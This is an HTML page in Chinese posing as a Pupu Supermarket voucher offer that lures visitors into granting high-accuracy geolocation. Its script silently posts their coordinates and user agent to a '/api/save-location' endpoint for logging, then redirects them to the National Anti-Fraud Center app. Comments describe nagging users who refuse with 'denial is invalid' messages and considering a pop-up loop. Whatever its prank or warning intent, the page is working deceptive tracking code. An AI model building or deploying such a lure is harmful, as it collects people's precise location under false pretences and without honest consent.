<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>朴朴超市代金券查询</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f5f5f7;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #333;
        }
        .card {
            max-width: 380px;
            margin: 60px auto;
            background: #ffffff;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
        }
        .logo { font-size: 45px; margin-bottom: 10px; }
        h2 { color: #2c2c2c; font-size: 20px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background-color: #07c160;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn:active { opacity: 0.85; }
        #status {
            margin-top: 15px;
            font-size: 13px;
            color: #d81e06;
            display: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">🥬</div>
        <h2>朴朴超市专属代金券</h2>
        <p>需要根据您当前所在的城市定位，为您精准匹配并派发百元大额代金券。</p>
        
        <button class="btn" onclick="requestLocation()">立即查询并领取</button>
        <div id="status">正在请求定位...</div>
    </div>

    <script>
        // 国家反诈中心 App Store 链接
        const antiFraudUrl = "https://apps.apple.com/cn/app/%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E4%B8%AD%E5%BF%83/id1552823102";

        function requestLocation() {
            const statusDiv = document.getElementById('status');
            statusDiv.style.display = 'block';

            if (!navigator.geolocation) {
                alert("您的浏览器不支持定位");
                return;
            }

            statusDiv.innerHTML = "📍 请在弹出的窗口中点击<b>“允许”</b>才能查询哦！";

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                // 1. 【点允许】：成功拿到经纬度 -> 记录日志 -> 立刻无情跳转反诈App！
                async function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;

                    statusDiv.innerHTML = "✅ 获取成功！正在带您前往专属页面...";

                    // 异步发送到后端记录到 Vercel 日志
                    try {
                        fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lon,
                                accuracy: acc,
                                ua: navigator.userAgent
                            })
                        });
                    } catch (e) {
                        console.log(e);
                    }

                    // 延迟 0.5 秒直接送走
                    setTimeout(() => {
                        window.location.href = antiFraudUrl;
                    }, 500);
                },

                // 2. 【点不允许】：拒绝了？那别走，继续强行再次请求/弹窗折磨！
                function(error) {
                    if (error.code === error.PERMISSION_DENIED) {
                        statusDiv.innerHTML = "⚠️ 拒绝无效！查询代金券必须允许定位，请重新点击并允许！";
                    } else {
                        statusDiv.innerHTML = "⚠️ 获取超时，请再次点击并允许定位！";
                    }
                    
                    // 稍微停顿一下，诱导其再次点击按钮
                    setTimeout(() => {
                        // 也可以选择直接再次自动调用 requestLocation() 形成死循环弹窗（不过部分iOS版本限制连续自动弹窗，需要用户再次手动点按钮）
                    }, 1000);
                },
                options
            );
        }
    </script>
</body>
</html>
